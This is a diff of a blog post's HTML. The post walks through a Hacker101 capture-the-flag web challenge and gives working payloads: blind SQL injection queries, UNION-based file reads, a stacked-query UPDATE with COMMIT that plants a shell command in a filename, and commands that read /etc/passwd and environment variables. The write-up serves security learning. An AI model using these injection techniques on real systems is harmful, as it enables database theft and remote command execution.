@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Note: This post contains spoilers and a detailed walkthrough of the level! First look 123456789101112&lt;!doctype html&gt;&lt;html&gt;	&lt;head&gt;		&lt;title&gt;Magical Image Gallery&lt;&#x2F;title&gt;	&amp;l">
+    <meta name="description" content="Note: This post contains spoilers and a detailed walkthrough of the level! First look  123456789101112&lt;!doctype html&gt;&lt;html&gt;	&lt;head&gt;		&lt;title&gt;Magical Image Gallery&lt;&#x2F;title&gt;	&amp;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hacker101 CTF Level 5: Photo Gallery">
 <meta property="og:url" content="https://leohuang.dev/2023/06/05/Hacker101-CTF-Level-5-Photo-Gallery/">
 <meta property="og:site_name" content="A blog">
-<meta property="og:description" content="Note: This post contains spoilers and a detailed walkthrough of the level! First look 123456789101112&lt;!doctype html&gt;&lt;html&gt;	&lt;head&gt;		&lt;title&gt;Magical Image Gallery&lt;&#x2F;title&gt;	&amp;l">
+<meta property="og:description" content="Note: This post contains spoilers and a detailed walkthrough of the level! First look  123456789101112&lt;!doctype html&gt;&lt;html&gt;	&lt;head&gt;		&lt;title&gt;Magical Image Gallery&lt;&#x2F;title&gt;	&amp;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leohuang.dev/2023/06/05/Hacker101-CTF-Level-5-Photo-Gallery/screenshot.png">
 <meta property="article:published_time" content="2023-06-05T13:59:16.000Z">
@@ -152,43 +152,43 @@
 
   <div class="content" itemprop="articleBody">
     <p><em>Note: This post contains spoilers and a detailed walkthrough of the level!</em></p>
-<h2 id="First-look"><a href="#First-look" class="headerlink" title="First look"></a>First look</h2><p><img src="/2023/06/05/Hacker101-CTF-Level-5-Photo-Gallery/screenshot.png" alt="Screenshot of the level"></p>
+<h2 id="First-look">First look</h2>
+<p><img src="screenshot.png" alt="Screenshot of the level"></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Magical Image Gallery<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Magical Image Gallery<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Kittens<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;fetch?id=1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;266&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Utterly adorable<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;fetch?id=2&quot;</span> <span class="attr">width</span>=<span class="string">&quot;266&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Purrfect<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;fetch?id=3&quot;</span> <span class="attr">width</span>=<span class="string">&quot;266&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Invisible<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>Space used: 0	total<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>The page is very basic. Notably, the 3rd image doesn’t show up, and I found that <code>/fetch?id=3</code> resulted in a
+<p>The page is very basic. Notably, the 3rd image doesn’t show up, and I found that <code>/fetch?id=3</code> resulted in a<br>
 <code>500 Internal Server Error</code>. Hmm.</p>
-<h2 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h2><p>As usual, I seem to find the flags out of order.</p>
-<p>The first thing I noticed was the source of the images: <code>/fetch?id=1</code>. The <code>id</code> parameter was an obvious place to try
-SQL injection, and I was able to successfully verify that the parameter was vulnerable to these attacks by trying common
+<h2 id="Flag-1">Flag 1</h2>
+<p>As usual, I seem to find the flags out of order.</p>
+<p>The first thing I noticed was the source of the images: <code>/fetch?id=1</code>. The <code>id</code> parameter was an obvious place to try<br>
+SQL injection, and I was able to successfully verify that the parameter was vulnerable to these attacks by trying common<br>
 strings like single quotes and semi-colons.</p>
-<p>In particular, I found that I received a <code>404</code> when trying to request <code>/fetch?id=4</code>, but received the image for id 1
+<p>In particular, I found that I received a <code>404</code> when trying to request <code>/fetch?id=4</code>, but received the image for id 1<br>
 when trying <code>/fetch?id=4 or 1</code>.</p>
-<p>The first attack I tried was a <code>UNION</code> attack. As a quick reminder, <code>UNION</code> in SQL allows you to run multiple queries
+<p>The first attack I tried was a <code>UNION</code> attack. As a quick reminder, <code>UNION</code> in SQL allows you to run multiple queries<br>
 and returns the results concatenated one after another. eg,</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> a <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> a <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> b <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
-
-<p>So I tried <code>/fetch?id=4 union select &#39;test&#39;</code>. My current mental model was hoping that the query looked something like
-<code>select image_data from images where id = &#123;&#125;</code>, so I was hoping that I would see the string <code>test</code> in the http response.
-If this was true, I would be able to run arbitrary SQL (reads, not writes) in the <code>UNION</code> and read whatever I wanted
+<p>So I tried <code>/fetch?id=4 union select 'test'</code>. My current mental model was hoping that the query looked something like<br>
+<code>select image_data from images where id = &#123;&#125;</code>, so I was hoping that I would see the string <code>test</code> in the http response.<br>
+If this was true, I would be able to run arbitrary SQL (reads, not writes) in the <code>UNION</code> and read whatever I wanted<br>
 from the database.</p>
-<p>Instead, I just got a <code>500 Internal Server Error</code>. Even worse, there was no additional information about the crash at all.
-This meant that I was going to have to perform Blind SQL Injection, which means that the only information I can glean
+<p>Instead, I just got a <code>500 Internal Server Error</code>. Even worse, there was no additional information about the crash at all.<br>
+This meant that I was going to have to perform Blind SQL Injection, which means that the only information I can glean<br>
 from each injection is “did it crash or not”.</p>
-<p>Before getting into the blind sqli (SQL Injection), I also tried <em>stacking queries</em> with something like
-<code>/fetch?id=1; update images set name = &#39;test&#39;;--</code> in the hopes of executing arbitrary modifications. It didn’t seem to
-do anything, not even crash, but I wasn’t sure if it was because I guessed the table name and column name wrong, or if
+<p>Before getting into the blind sqli (SQL Injection), I also tried <em>stacking queries</em> with something like<br>
+<code>/fetch?id=1; update images set name = 'test';--</code> in the hopes of executing arbitrary modifications. It didn’t seem to<br>
+do anything, not even crash, but I wasn’t sure if it was because I guessed the table name and column name wrong, or if<br>
 the server wasn’t vulnerable to stacked queries.</p>
-<p>The key to blind sqli is to be able to produce a crash <em>conditionally</em>. You can’t introduce a syntax
-error, but rather need to cause an error in the query at runtime. For example, <code>1 / 0</code> produces a runtime error in some
+<p>The key to blind sqli is to be able to produce a crash <em>conditionally</em>. You can’t introduce a syntax<br>
+error, but rather need to cause an error in the query at runtime. For example, <code>1 / 0</code> produces a runtime error in some<br>
 databases.</p>
-<p>I was pretty sure I was up against MySQL though (that’s what the previous challenges used), so I would need something
+<p>I was pretty sure I was up against MySQL though (that’s what the previous challenges used), so I would need something<br>
 like:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($&#123;<span class="keyword">condition</span>&#125;,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables),<span class="keyword">null</span>)</span><br></pre></td></tr></table></figure>
-<p>The reason <code>(select table_name from information_schema.tables)</code> produces a runtime error is because a sub-select in this
-context may only return a single row. <code>information_schema.tables</code> contains metadata about the database and is guaranteed
-to exist, and is also guaranteed to return (much) more than a single row due to the dozens of system tables present in
+<p>The reason <code>(select table_name from information_schema.tables)</code> produces a runtime error is because a sub-select in this<br>
+context may only return a single row. <code>information_schema.tables</code> contains metadata about the database and is guaranteed<br>
+to exist, and is also guaranteed to return (much) more than a single row due to the dozens of system tables present in<br>
 every MySQL database.</p>
-<p>I started by exploring the database schema (I still wanted to double-check my attempt on stacking queries) and wanted
+<p>I started by exploring the database schema (I still wanted to double-check my attempt on stacking queries) and wanted<br>
 to find out:</p>
 <ol>
 <li>How many tables are there?</li>
@@ -196,26 +196,23 @@ to find out:</p>
 <li>For each table, what are its columns?</li>
 <li>What are the values of some of those columns?</li>
 </ol>
-<p>Getting all this information via blind sqli is slow and rather painful. The general gist of the attack is to answer
-a series of ‘yes&#x2F;no’ questions and extract one bit (literally) of information at a time by asking things like:</p>
+<p>Getting all this information via blind sqli is slow and rather painful. The general gist of the attack is to answer<br>
+a series of ‘yes/no’ questions and extract one bit (literally) of information at a time by asking things like:</p>
 <ul>
 <li>is the number of tables greater than 10?</li>
 <li>no? how about 5?</li>
 <li>is the first character of the first table greater than ‘m’?</li>
 <li>no? how about ‘g’?</li>
-<li>what about the second character?
+<li>what about the second character?<br>
 etc, etc</li>
 </ul>
 <p>An example of getting the number of tables (formatted for readability):</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/fetch?id=1 union select if(</span><br><span class="line">  (</span><br><span class="line">    select count(*) from information_schema.tables</span><br><span class="line">    where table_schema not in (                       -- Exclude system tables</span><br><span class="line">      &#x27;information_schema&#x27;,</span><br><span class="line">      &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;performance_schema&#x27;,</span><br><span class="line">      &#x27;sys&#x27;</span><br><span class="line">    )</span><br><span class="line">  ) &lt; 10,                                             -- Is the number of tables less than 10?</span><br><span class="line">  (select table_name from information_schema.tables), -- Produces runtime error</span><br><span class="line">  null                                                -- Results in a no-op basically</span><br><span class="line">)`</span><br></pre></td></tr></table></figure>
-
 <p>An example of getting the length of a single table name:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/fetch?id=1 union select if(</span><br><span class="line">  (</span><br><span class="line">    select length(table_name) from information_schema.tables</span><br><span class="line">    where table_schema not in (                       -- Exclude system tables</span><br><span class="line">      &#x27;information_schema&#x27;,</span><br><span class="line">      &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;performance_schema&#x27;,</span><br><span class="line">      &#x27;sys&#x27;</span><br><span class="line">    )</span><br><span class="line">    limit 1                                           -- Limit to a single table</span><br><span class="line">    offset 1                                          -- Offset to get details of the second table</span><br><span class="line">  ) &lt; 10,                                             -- Is the number of tables less than 10?</span><br><span class="line">  (select table_name from information_schema.tables), -- Produces runtime error</span><br><span class="line">  null                                                -- Results in a no-op basically</span><br><span class="line">)`</span><br></pre></td></tr></table></figure>
-
 <p>An example of getting a character in a string:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/fetch?id=1 union select if(</span><br><span class="line">  (</span><br><span class="line">    select ascii(                                     -- Ascii code of a character, means we can re-use common numerical binary search logic</span><br><span class="line">      substring(filename, 6, 1)                       -- The 6th character of the string (SQL uses 1-indexing here)</span><br><span class="line">    ) from photos</span><br><span class="line">  ) &lt; 130,                                            -- Is the ascii value of the character less than 130?</span><br><span class="line">  (select table_name from information_schema.tables), -- Produces runtime error</span><br><span class="line">  null                                                -- Results in a no-op basically</span><br><span class="line">)`</span><br></pre></td></tr></table></figure>
-
-<p>I wrote a series of scripts because it would be hell-ish to do this by hand, and eventually (blind sqli is quite slow,
+<p>I wrote a series of scripts because it would be hell-ish to do this by hand, and eventually (blind sqli is quite slow,<br>
 especially if the target service is running in a low-powered Docker container because it’s a free CTF) I found:</p>
 <ul>
 <li>There are 2 tables: <code>albums</code> and <code>photos</code></li>
@@ -227,29 +224,31 @@ especially if the target service is running in a low-powered Docker container be
 <li>Photo 3: <code>title: Invisible</code>, <code>filename: &lt;flag&gt;</code></li>
 </ul>
 <p>And there we have it - the file name of photo 3 is Flag 1!</p>
-<h2 id="Flag-0"><a href="#Flag-0" class="headerlink" title="Flag 0"></a>Flag 0</h2><p>From exploring the database, I was able to build a better mental model of what kind of SQL query the
+<h2 id="Flag-0">Flag 0</h2>
+<p>From exploring the database, I was able to build a better mental model of what kind of SQL query the<br>
 server was making. I suspected it was something like:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> filename <span class="keyword">from</span> photos <span class="keyword">where</span> id <span class="operator">=</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>
-<p>and then look up the file on disk to serve to the client. This explains why the photo with id 3 returns a
-<code>500</code>, as well as any of my <code>UNION</code> attacks - the server would crash when it tried to look up a non-existent
+<p>and then look up the file on disk to serve to the client. This explains why the photo with id 3 returns a<br>
+<code>500</code>, as well as any of my <code>UNION</code> attacks - the server would crash when it tried to look up a non-existent<br>
 file!</p>
-<p>I tested my theory by crafting another <code>UNION</code> attack, but pointed it at a file that I knew existed:
-<code>/fetch?id=4 union select &#39;files/adorable.png&#39;</code> (the file for photo 1) and it worked!</p>
-<p>Armed this with knowledge, I wondered if I had arbitrary read access to the entire filesystem of the server, and
+<p>I tested my theory by crafting another <code>UNION</code> attack, but pointed it at a file that I knew existed:<br>
+<code>/fetch?id=4 union select 'files/adorable.png'</code> (the file for photo 1) and it worked!</p>
+<p>Armed this with knowledge, I wondered if I had arbitrary read access to the entire filesystem of the server, and<br>
 started looking for other interesting files. I tried:</p>
 <ul>
 <li>index.html</li>
 <li>index.htm</li>
 <li>index.php</li>
-<li>files&#x2F;*.png</li>
+<li>files/*.png</li>
 <li>*</li>
-<li>..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<ul>
-<li>This is a file that’s guaranteed to exist on Unix systems. I’m pretty sure it was a Unix system because the
-known file paths used forward slashes rather than backslashes. Although the code could just be converting it
+<li>…/…/…/etc/passwd
+<ul>
+<li>This is a file that’s guaranteed to exist on Unix systems. I’m pretty sure it was a Unix system because the<br>
+known file paths used forward slashes rather than backslashes. Although the code could just be converting it<br>
 into platform-specific paths.</li>
 </ul>
 </li>
-<li>&#x2F;etc&#x2F;passwod</li>
+<li>/etc/passwod</li>
 <li>windows-specific .ini file that I can’t exactly recall now</li>
 <li>encoding the forward slashes as <code>%2e</code> (pretty sure I didn’t need this because the know file paths worked)</li>
 </ul>
@@ -258,72 +257,76 @@ into platform-specific paths.</li>
 <blockquote>
 <p>This application runs on the uwsgi-nginx-flask-docker image</p>
 </blockquote>
-<p>Some very quick research led me to look for <code>main.py</code> by using <code>/fetch?id=4 union select &#39;main.py&#39;</code> and it immediately
-worked. Being able to see the actual source code was like turning on the light - instead of blindly groping around and
+<p>Some very quick research led me to look for <code>main.py</code> by using <code>/fetch?id=4 union select 'main.py'</code> and it immediately<br>
+worked. Being able to see the actual source code was like turning on the light - instead of blindly groping around and<br>
 crafting theories, I had perfect knowledge of the target I was trying to exploit.</p>
 <p>The source code immediately answered a bunch of questions that I had:</p>
 <ul>
-<li>The exact SQL query powering the <code>fetch</code> endpoint: <code>&#39;SELECT filename FROM photos WHERE id=%s&#39; % request.args[&#39;id&#39;]</code></li>
-<li>Why <code>..</code> didn’t work in my directory traversal attack: <code>return file(&#39;./%s&#39; % cur.fetchone()[0].replace(&#39;..&#39;, &#39;&#39;), &#39;rb&#39;).read()</code></li>
+<li>The exact SQL query powering the <code>fetch</code> endpoint: <code>'SELECT filename FROM photos WHERE id=%s' % request.args['id']</code></li>
+<li>Why <code>..</code> didn’t work in my directory traversal attack: <code>return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()</code></li>
 </ul>
 <p>It also revealed a few other very interesting things:</p>
 <ul>
 <li>Flag 0 :)</li>
 <li>Database connection credentials: <code>MySQLdb.connect(host=&quot;localhost&quot;, user=&quot;root&quot;, password=&quot;&quot;, db=&quot;level5&quot;)</code></li>
-<li>Shell injection vulnerability:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch %s || exit 0&#x27;</span> % <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;files/&#x27;</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;\n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li>Shell injection vulnerability:</li>
 </ul>
-<h2 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2"></a>Flag 2</h2><p>The <code>du -ch</code> command attempts to calculate the size of files on disk.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep += <span class="string">&#x27;&lt;i&gt;Space used: &#x27;</span> + subprocess.check_output(<span class="string">&#x27;du -ch %s || exit 0&#x27;</span> % <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;files/&#x27;</span> + fn <span class="keyword">for</span> fn <span class="keyword">in</span> fns), shell=<span class="literal">True</span>, stderr=subprocess.STDOUT).strip().rsplit(<span class="string">&#x27;\n&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>] + <span class="string">&#x27;&lt;/i&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Flag-2">Flag 2</h2>
+<p>The <code>du -ch</code> command attempts to calculate the size of files on disk.</p>
 <ul>
 <li><code>-c</code> Prints a total size of all specified files</li>
 <li><code>-h</code> Prints sizes in human-readable form (eg, 8.0K instead of 8192000)</li>
 </ul>
-<p>The final command on the shell would look like <code>du -ch files/adorable.jpg files/purrfect.jpg files/&lt;flag1&gt; || exit 0</code>
-which explains why the webpage displays “Space used 0” - the non-existent <code>files/&lt;flag1&gt;</code> file is causing the command to
+<p>The final command on the shell would look like <code>du -ch files/adorable.jpg files/purrfect.jpg files/&lt;flag1&gt; || exit 0</code><br>
+which explains why the webpage displays “Space used 0” - the non-existent <code>files/&lt;flag1&gt;</code> file is causing the command to<br>
 error out.</p>
-<p>After running the shell command, the Python code also only reads the last line of <code>stdout</code> (<code>.rsplit(&#39;\n&#39;, 1)[-1]</code>),
+<p>After running the shell command, the Python code also only reads the last line of <code>stdout</code> (<code>.rsplit('\n', 1)[-1]</code>),<br>
 with the intent of only printing out the total size.</p>
-<p>There is an obvious exploit: inject an alternate shell command by modifying the filename to <code>; pwd</code>, for example, which
-would make the entire command <code>du -ch files/adorable.jpg files/purrfect.jpg files/; pwd || exit 0</code> and render the output
+<p>There is an obvious exploit: inject an alternate shell command by modifying the filename to <code>; pwd</code>, for example, which<br>
+would make the entire command <code>du -ch files/adorable.jpg files/purrfect.jpg files/; pwd || exit 0</code> and render the output<br>
 of <code>pwd</code> (the current directory).</p>
-<p>But how do we modify the filename of one of the files? I thought I could use the database credentials found in the source
+<p>But how do we modify the filename of one of the files? I thought I could use the database credentials found in the source<br>
 code to connect directly to the database, but the port wasn’t open to the internet.</p>
 <p>I was again stumped, until this hint:</p>
 <blockquote>
 <p>Stacked queries rarely work. But when they do, make absolutely sure that you’re committed</p>
 </blockquote>
 <p>I surmised that adding the SQL <code>COMMIT</code> statement would allow the stacked queries to work - and it did!</p>
-<p>The source code shows that the <code>MySQLdb</code> python library is used to execute database queries, and a bit of research
-shows that it executes queries in a database transaction automatically, and the <code>autocommit</code> option is set to false
-by default. The library expects the user to use the <code>commit()</code> function to commit the transaction, but we can get
+<p>The source code shows that the <code>MySQLdb</code> python library is used to execute database queries, and a bit of research<br>
+shows that it executes queries in a database transaction automatically, and the <code>autocommit</code> option is set to false<br>
+by default. The library expects the user to use the <code>commit()</code> function to commit the transaction, but we can get<br>
 away with adding it to the end of our stacked queries.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fetch?id=1; update photos set filename = &#x27;;pwd&#x27; where id = 3; commit;--</span><br></pre></td></tr></table></figure>
-
-<p>This payload effectively dumps the output of <code>pwd</code> straight into the HTML when we view the home page, where the
+<p>This payload effectively dumps the output of <code>pwd</code> straight into the HTML when we view the home page, where the<br>
 original space calculation output was.</p>
-<p>One last thing to note is that the Python server only returns the last line of shell output, so I did a quick replacement
-of newlines in order to get all of the output. eg, <code>; cat /etc/passwd | tr &quot;\n&quot; &quot;|&quot;</code> which replaces all newlines with
+<p>One last thing to note is that the Python server only returns the last line of shell output, so I did a quick replacement<br>
+of newlines in order to get all of the output. eg, <code>; cat /etc/passwd | tr &quot;\n&quot; &quot;|&quot;</code> which replaces all newlines with<br>
 pipe characters.</p>
-<p>I tried a variety of shell commands and it was <em>so liberating</em> to get all the output reflected back to me. Compared to
-the blind sqli from before, I felt like a starving man who stumbled into a feast. I basically had a full shell on the
+<p>I tried a variety of shell commands and it was <em>so liberating</em> to get all the output reflected back to me. Compared to<br>
+the blind sqli from before, I felt like a starving man who stumbled into a feast. I basically had a full shell on the<br>
 server (and even briefly considered writing a script to emulate a CLI) and could probably do all sorts of nasty things.</p>
-<p>I had fun exploring the filesystem and looking at all the files, but eventually remembered to look at the
+<p>I had fun exploring the filesystem and looking at all the files, but eventually remembered to look at the<br>
 environment variables with the <code>env</code> command.</p>
 <p>Lo and behold, there I found all 3 flags.</p>
-<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><strong>Time taken:</strong> ~5 hours</p>
+<h2 id="Summary">Summary</h2>
+<p><strong>Time taken:</strong> ~5 hours</p>
 <p><strong>Hints needed:</strong></p>
 <ul>
 <li>That it was a Flask webserver</li>
 <li>That <code>commit</code> could make stacked queries work</li>
 </ul>
-<h2 id="Takeaways"><a href="#Takeaways" class="headerlink" title="Takeaways"></a>Takeaways</h2><ul>
+<h2 id="Takeaways">Takeaways</h2>
+<ul>
 <li>SQLMap automatically dumps databases with blind sqli (but I found my experience very educational)</li>
 <li>Knowing your target environment (backend framework, OS, DB, etc) is <em>extremely</em> useful</li>
 <li>Broad knowledge about many different environments is crucial to be a successful hacker</li>
 <li>Try <code>COMMIT</code> for stacked queries</li>
 </ul>
-<h2 id="References-and-links"><a href="#References-and-links" class="headerlink" title="References and links"></a>References and links</h2><ul>
-<li>https:&#x2F;&#x2F;portswigger.net&#x2F;web-security&#x2F;sql-injection&#x2F;cheat-sheet</li>
-<li>https:&#x2F;&#x2F;sqlmap.org&#x2F;</li>
+<h2 id="References-and-links">References and links</h2>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></li>
+<li><a target="_blank" rel="noopener" href="https://sqlmap.org/">https://sqlmap.org/</a></li>
 </ul>
 
   </div>
@@ -390,7 +393,7 @@ environment variables with the <code>env</code> command.</p>
     Copyright &copy;
     
     
-    2016-2024
+    2016-2025
     Leo Huang
   </div>
   <div class="footer-right">
